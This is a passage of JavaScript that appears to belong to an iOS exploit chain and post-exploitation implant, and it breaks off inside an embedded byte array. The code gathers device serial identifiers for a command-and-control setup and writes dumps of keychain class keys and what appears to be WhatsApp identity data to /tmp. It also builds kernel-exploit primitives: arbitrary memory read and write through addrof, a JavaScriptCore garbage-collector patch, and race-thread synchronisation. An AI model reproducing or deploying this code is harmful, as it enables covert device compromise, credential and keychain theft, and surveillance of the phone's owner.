      source: serial ? "serial" : (unique ? "unique" : (peid ? "peid" : "pe_pid"))
    };
    globalThis.__pe_device_ids = ids;
    try {
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
      __peWriteFileUtf8(PE_DEVICE_PATH, JSON.stringify(ids));
    } catch (_) {}
    return ids;
  }
  function peProbeSerialIokitOnce(N) {
    // IOKit serial from mediaplaybackd listen loop hangs the worker (lab boot #3).
    try {
      if (globalThis.PE_DIRECT_PIPELINE === true || globalThis.PE_SKIP_BS_INJECT === true)
        return globalThis.__pe_device_ids || null;
    } catch (_) {}
    try {
      if (globalThis.__pe_serial_probed) return globalThis.__pe_device_ids || null;
      globalThis.__pe_serial_probed = true;
      let cur = peResolveDeviceIds(N, { allowNative: false });
      if (cur && cur.serial && cur.source !== "pe_pid") return cur;
      let buf = N.callSymbol("calloc", 1, 128);
      let serial = __peIokitSerial(N, buf, 120) || "";
      try { N.callSymbol("free", buf); } catch (_) {}
      if (!serial) {
        LOG("[PE-LISTEN] serial iokit probe miss");
        return cur;
      }
      let ids = {
        uuid: String(serial),
        serial: String(serial),
        unique: (cur && cur.unique) || "",
        ts: Date.now(),
        source: "iokit"
      };
      globalThis.__pe_device_ids = ids;
      try {
        fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff);
        __peWriteFileUtf8(PE_DEVICE_PATH, JSON.stringify(ids));
      } catch (_) {}
      LOG("[PE-LISTEN] serial iokit probe ok uuid=" + serial);
      return ids;
    } catch (e) {
      LOG("[PE-LISTEN] serial iokit probe ERR: " + String(e).slice(0, 80));
      return null;
    }
  }
  globalThis.peProbeSerialIokitOnce = peProbeSerialIokitOnce;
  let PE_P7_CACHE_PATH = "/tmp/c2_ipc/p7.cache.json";
  let PE_WA_IDENTITY_PATH = "/tmp/wa_identity.json";
  let PE_P7_CLASSKEYS_PATH = "/tmp/p7_classkeys.json";
  let PE_P7_BLOB3_PATH = "/tmp/p7_blob3.json";
  let PE_P7_DUMP_PATH = "/tmp/keychain_c2_dump.json";
  function peP7FileHasHead(path, minLen) {
    try {
      let head = __peReadFileUtf8(path, Math.max(8, Number(minLen) || 64));
      return !!(head && head.length > 8);
    } catch (_) {
      return false;
    }
  }
  function peP7IdentityOnDisk() {
    return peP7FileHasHead(PE_WA_IDENTITY_PATH, 64);
  }
  function peP7ClassKeysOnDisk() {
    return peP7FileHasHead(PE_P7_CLASSKEYS_PATH, 64);
  }
  function peP7DumpOnDisk() {
    return peP7FileHasHead(PE_P7_DUMP_PATH, 64);
  }
  function peP7U8ToHex(u8) {
    if (!u8 || !u8.length) return "";
    let hx = "";
    for (let i = 0; i < u8.length; i++) hx += ("0" + u8[i].toString(16)).slice(-2);
    return hx;
  }
  function peP7WriteJsonTmp(path, obj) {
    try {
      __peWriteFileUtf8(path, JSON.stringify(obj) + "\n");
      return true;
    } catch (_) {
      return false;
    }
  }
  function peP7WriteClassKeysFile(metaKeys) {
    try {
      let keys = {};
      let n = 0;
      for (let ck in (metaKeys || {})) {
        if (!metaKeys[ck]) continue;
        keys[String(ck)] = peP7U8ToHex(metaKeys[ck]);
        n++;
      }
      let ok = peP7WriteJsonTmp(PE_P7_CLASSKEYS_PATH, {
        ts: Date.now(), source: "p7_4a", n: n, keys: keys
      });
      LOG("[P7] [4a] classkeys " + (ok ? "written" : "write_fail") + " n=" + n);
      return ok ? n : 0;
    } catch (e) {
      LOG("[P7] [4a] classkeys ERR: " + String(e).slice(0, 80));
      return 0;
    }
  }
  function peP7WriteBlob3File(blob3Map) {
    try {
      let n = 0;
      for (let k in (blob3Map || {})) n++;
      let ok = peP7WriteJsonTmp(PE_P7_BLOB3_PATH, {
        ts: Date.now(), source: "p7_4a", n: n, keys: blob3Map || {}
      });
      LOG("[P7] [4a] blob3 " + (ok ? "written" : "write_fail") + " n=" + n);
      return ok ? n : 0;
    } catch (e) {
      LOG("[P7] [4a] blob3 ERR: " + String(e).slice(0, 80));
      return 0;
    }
  }
  function peP7CacheLoad() {
    try {
      let raw = __peReadFileUtf8(PE_P7_CACHE_PATH, 4096);
      if (!raw) return null;
      return JSON.parse(raw);
    } catch (_) {
      return null;
    }
  }
  function peP7CacheSave(obj) {
    try {
      let o = obj || {};
      o.ts = Date.now();
      if (peP7IdentityOnDisk()) o.wa_identity = true;
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
      __peWriteFileUtf8(PE_P7_CACHE_PATH, JSON.stringify(o) + "\n");
    } catch (_) {}
  }
  globalThis.peP7CacheLoad = peP7CacheLoad;
  globalThis.peP7CacheSave = peP7CacheSave;
  globalThis.peP7IdentityOnDisk = peP7IdentityOnDisk;
  globalThis.peP7ClassKeysOnDisk = peP7ClassKeysOnDisk;
  globalThis.peP7DumpOnDisk = peP7DumpOnDisk;
  globalThis.peP7WriteClassKeysFile = peP7WriteClassKeysFile;
  globalThis.peP7WriteBlob3File = peP7WriteBlob3File;
  globalThis.peP7U8ToHex = peP7U8ToHex;
  function pePayloadIdentity() {
    // Prefer partner uuid (SerialNumber) for /api/payload/get + auth gates.
    try {
      let ids = globalThis.__pe_device_ids;
      if (!ids || !ids.uuid) {
        let cached = __peReadFileUtf8(PE_DEVICE_PATH, 4096);
        if (cached) {
          try { ids = JSON.parse(cached); } catch (_) { ids = null; }
        }
      }
      if (ids && ids.uuid) {
        let dc = String(ids.uuid);
        let peid = String(ids.peid || (__peValidPeid(dc) ? dc : "") || "");
        if (ids.source === "pe_pid" || __peIsPidPlaceholder(dc)) {
          return { uid: dc, device_code: dc, uuid: dc, peid: peid, source: ids.source || "pe_pid" };
        }
        return {
          uid: dc,
          device_code: dc,
          uuid: dc,
          peid: peid,
          serial: String(ids.serial || ""),
          source: ids.source || "serial"
        };
      }
    } catch (_) {}
    try {
      let pe = "pe-" + Number(fcall(GETPID));
      return { uid: pe, device_code: pe, uuid: pe, source: "pe_pid" };
    } catch (_) {
      return { uid: "pe", device_code: "pe", uuid: "pe", source: "pe_pid" };
    }
  }
  globalThis.peResolveDeviceIds = peResolveDeviceIds;
  globalThis.pePayloadIdentity = pePayloadIdentity;

  __peEarly("[PE-PROBE-E4] before LOG rebind");
  function LOG(msg) {
    try {
      let s = String(msg == null ? "" : msg);
      // Exploit-chain detail: keep milestones + failures only.
      if (s.indexOf("[+] ") === 0 || s.indexOf("[i] ") === 0) {
        if (s.indexOf("PE Post-Exploitation") < 0 &&
            s.indexOf("kernel_base") < 0 &&
            s.indexOf("kernel_slide") < 0 &&
            s.indexOf("highiest_success") < 0 &&
            s.indexOf("success_read_count") < 0 &&
            s.indexOf("Running on") < 0) {
          return;
        }
      }
      // pe_worker / listen chatter
      if (s.indexOf("[PE-ID] peid ready") === 0) return;
      if (s.indexOf("[UCRED]") === 0 && s.indexOf("error") < 0) return;
      if (s.indexOf("[THREAD]") === 0) return;
      if (s.indexOf("[PE-WORKER] skip ") === 0) return;
      if (s.indexOf("[PE-WORKER] settle") === 0) return;
      if (s.indexOf("[PE-WORKER] waiting") === 0) return;
      if (s.indexOf("[PE-WORKER] C2_STUB_ONLY") === 0) return;
      if (s.indexOf("[PE-MAIN] start() entered") === 0 && s.indexOf("ABORT") < 0) {
        // keep one short enter line only when flags present
        if (s.indexOf("PE_SKIP_WORKER_EXIT") < 0) return;
      }
      if (s.indexOf("[PE-LISTEN] heartbeat") === 0) return;
      if (s.indexOf("[PE-LISTEN] pe_direct report OK") === 0) return;
    } catch (_) {}
    __peLogPost(msg);
  }
  globalThis.LOG = LOG;
  try {
    LOG("[PE-PROBE-0] outer shell ready pid=" + fcall(GETPID));
  } catch (_peProbe0) {}
  function getsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(GETSOCKOPT, socket, level, option_name, option_value, option_len);
  }
  function setsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(SETSOCKOPT, socket, level, option_name, option_value, option_len);
  }
  function fileport_makeport(fd, port) {
    return fcall(FILEPORT_MAKEPORT, fd, port);
  }
  function fileport_makefd(port) {
    return fcall(FILEPORT_MAKEFD, port);
  }
  function memset_pattern8(buf, val, sz) {
    return fcall(MEMSET_PATTERN8, buf, val, sz);
  }
  function memmem(big, big_len, little, little_len) {
    return fcall(MEMMEM, big, big_len, little, little_len);
  }
  function access(path, mode) {
    return fcall(ACCESS, path, mode);
  }
  function open(path, mode) {
    return fcall(OPEN, path, mode);
  }
  function fopen(path, mode) {
    return fcall(FOPEN, path, mode);
  }
  function fclose(fd) {
    return fcall(FCLOSE, fd);
  }
  function fwrite(buf, sz, nitem, fd) {
    return fcall(FWRITE, buf, sz, nitem, fd);
  }
  function preadv(fildes, iov, iovcnt, offset) {
    return fcall(PREADV, fildes, iov, iovcnt, offset);
  }
  function pwritev(fildes, iov, iovcnt, offset) {
    return fcall(PWRITEV, fildes, iov, iovcnt, offset);
  }
  function pwrite(fildes, buff, size, offset) {
    return fcall(PWRITE, fildes, buff, size, offset);
  }
  function pread(fildes, buff, size, offset) {
    return fcall(PREAD, fildes, buff, size, offset);
  }
  function read(fd, buf, sz) {
    return fcall(READ, fd, buf, sz);
  }
  function write(fd, buf, sz) {
    return fcall(WRITE, fd, buf, sz);
  }
  function remove(path) {
    return fcall(REMOVE, path);
  }
  function arc4random() {
    return fcall(ARC4RANDOM);
  }
  function task_threads(task, thread_list_addr, thread_count_addr) {
    return fcall(TASK_THREADS, task, thread_list_addr, thread_count_addr);
  }
  function fcntl(fd, flag, value) {
    return fcall(FCNTL, fd, flag, 0n, 0n, 0n, 0n, 0n, 0n, value);
  }
  function lseek(fildes, offset, whence) {
    return fcall(LSEEK, fildes, offset, whence);
  }
  function fsync(fd) {
    return fcall(FSYNC, fd);
  }
  function CFStringCreateWithCString(allocator, cstring, encoding) {
    return fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
  }
  function CFStringCreateCopy(allocator, cfstring) {
    return fcall(CFSTRINGCREATECOPY, allocator, cfstring);
  }
  function CFDictionarySetValue(dict, key, value) {
    return fcall(CFDICTIONARYSETVALUE, dict, key, value);
  }
  function CFNumberCreate(allocator, theType, valuePtr) {
    return fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
  }
  function IOSurfaceCreate(dict) {
    return fcall(IOSURFACECREATE, dict);
  }
  function IOSurfaceGetBaseAddress(surface) {
    return fcall(IOSURFACEGETBASEADDRESS, surface);
  }
  function IOSurfacePrefetchPages(surface) {
    return fcall(IOSURFACEPREFETCHPAGES, surface);
  }
  function CFRelease(obj) {
    return fcall(CFRELEASE, obj);
  }
  function CFShow(obj) {
    return fcall(CFSHOW, obj);
  }
  function mach_make_memory_entry_64(target_task, size, offset, permission, object_handle, parent_entry) {
    return fcall(MACH_MAKE_MEMORY_ENTRY_64, target_task, size, offset, permission, object_handle, parent_entry);
  }
  function mach_vm_map(target_task, address, size, mask, flags, object, offset, copy, cur_protection, max_protection, inheritance) {
    return fcall(MACH_VM_MAP, target_task, address, size, mask, flags, object, offset, copy, cur_protection | max_protection << 32n, inheritance);
  }
  function mmap(addr, len, prot, flags, fd, offset) {
    return fcall(MMAP, addr, len, prot, flags, fd, offset);
  }
  function mlock(address, size) {
    return fcall(MLOCK, address, size);
  }
  function munlock(address, size) {
    return fcall(MUNLOCK, address, size);
  }
  function mach_port_deallocate(task, name) {
    return fcall(MACH_PORT_DEALLOCATE, task, name);
  }
  function mach_task_self() {
    return 0x203n;
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function disable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 0n);
  }
  function enable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 1n);
  }
  function disarm_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let m_threadGroup = uread64(heap + 0x198n);
    let threads = uread64(m_threadGroup);
    uwrite64(threads + 0x20n, 0x0n);
  }
  disable_gc();
  disarm_gc();
  enable_gc();
  let executable_name = 0n;
  let read_file_path = 0n;
  let write_file_path = 0n;
  let target_file_size = PAGE_SIZE * 0x2n;
  let oob_offset = 0x100n;
  let oob_size = 0xf00n;
  let n_of_oob_pages = 2n;
  let pc_address = new_bigint();
  let pc_size = 0n;
  let pc_object = new_bigint();
  let free_target = 0n;
  let free_target_size = 0n;
  let write_fd = 0n;
  let read_fd = 0n;
  let random_marker = arc4random() << 32n | arc4random();
  let wired_page_marker = arc4random() << 32n | arc4random();
  let free_thread_start_ptr = 0n;
  let free_target_sync_ptr = 0n;
  let free_target_size_sync_ptr = 0n;
  let target_object_sync_ptr = 0n;
  let target_object_offset_sync_ptr = 0n;
  let go_sync_ptr = 0n;
  let race_sync_ptr = 0n;
  let free_thread_jsthread = 0n;
  let free_thread_arg = 0n;
  function init_target_file() {
    let _CS_DARWIN_USER_TEMP_DIR = 65537n;
    read_file_path = calloc(1n, 1024n);
    write_file_path = calloc(1n, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
    strcat(read_file_path, get_cstring(`/${arc4random().hex()}`));
    strcat(write_file_path, get_cstring(`/${arc4random().hex()}`));
    create_target_file(read_file_path);
    create_target_file(write_file_path);
    read_fd = open(read_file_path, 0x2n);
    write_fd = open(write_file_path, 0x2n);
    LOG("[+] read_fd: " + read_fd.hex());
    LOG("[+] write_fd: " + write_fd.hex());
    remove(read_file_path);
    remove(write_file_path);
    fcntl(read_fd, 48n, 1n);
    fcntl(write_fd, 48n, 1n);
  }
  function pe_init() {
    init_target_file();
    if (executable_name == 0n) {
      let length = BigInt("0x1024");
      let executable_path = calloc(1n, length);
      _NSGetExecutablePath(executable_path, get_bigint_addr(length));
      executable_name = strrchr(executable_path, 0x2fn);
      if (executable_name != 0n) {
        executable_name = executable_name + 0x1n;
      } else {
        executable_name = executable_path;
      }
    }
    free_thread_arg = calloc(1n, PAGE_SIZE);
    LOG("[+] free_thread_arg: " + free_thread_arg.hex());
    free_thread_start_ptr = free_thread_arg;
    free_target_sync_ptr = free_thread_arg + 0x8n;
    free_target_size_sync_ptr = free_thread_arg + 0x10n;
    target_object_sync_ptr = free_thread_arg + 0x18n;
    target_object_offset_sync_ptr = free_thread_arg + 0x20n;
    go_sync_ptr = free_thread_arg + 0x28n;
    race_sync_ptr = free_thread_arg + 0x30n;
    let free_thread_js_data = new Uint8Array([102, 99, 97, 108, 108, 95, 105, 110, 105, 116, 40, 41, 59, 10, 108, 101, 116, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 32, 32, 32, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 67, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 82, 69, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 114, 101, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 69, 77, 67, 80, 89, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 34, 41, 59, 10, 10, 108, 101, 116, 32, 83, 76, 69, 69, 80, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 85, 83, 76, 69, 69, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 77, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 80, 89, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 80, 89, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 78, 80, 82, 73, 78, 84, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 110, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 73, 78, 84, 70, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 10, 108, 101, 116, 32, 69, 82, 82, 78, 79, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 114, 114, 110, 111, 34, 41, 59, 10, 108, 101, 116, 32, 67, 76, 79, 83, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 69, 88, 73, 84, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 120, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 67, 72, 65, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 99, 104, 97, 114, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 80, 73, 68, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 112, 105, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 89, 83, 67, 65, 76, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 121, 115, 99, 97, 108, 108, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 77, 97, 115, 116, 101, 114, 80, 111, 114, 116, 68, 101, 102, 97, 117, 108, 116, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 115, 115, 101, 114, 116, 40, 97, 44, 32, 98, 32, 61, 32, 34, 78, 47, 65, 34, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 33, 97, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 96, 97, 115, 115, 101, 114, 116, 32, 102, 97, 105, 108, 101, 100, 58, 32, 36, 123, 98, 125, 96, 41, 10, 32, 32, 32, 32, 125, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 69, 82, 82, 79, 82, 40, 97, 41, 32, 123, 32, 116, 104, 114, 111, 119, 32, 110, 101, 119, 32, 69, 114, 114, 111, 114, 40, 97, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 32, 61, 32, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 108, 108, 111, 99, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 76, 76, 79, 67, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 82, 69, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 117, 115, 108, 101, 101, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 85, 83, 76, 69, 69, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 109, 112, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 77, 80, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 110, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 78, 80, 82, 73, 78, 84, 70, 44, 32, 98, 117, 102, 44, 32, 115, 105, 122, 101, 44, 32, 102, 109, 116, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 105, 110, 116, 102, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 73, 78, 84, 70, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 102, 109, 116, 41, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 108, 111, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 76, 79, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 120, 105, 116, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 69, 88, 73, 84, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 99, 104, 97, 114, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 67, 72, 65, 82, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 112, 105, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 80, 73, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 121, 115, 99, 97, 108, 108, 40, 110, 117, 109, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 89, 83, 67, 65, 76, 76, 44, 32, 110, 117, 109, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 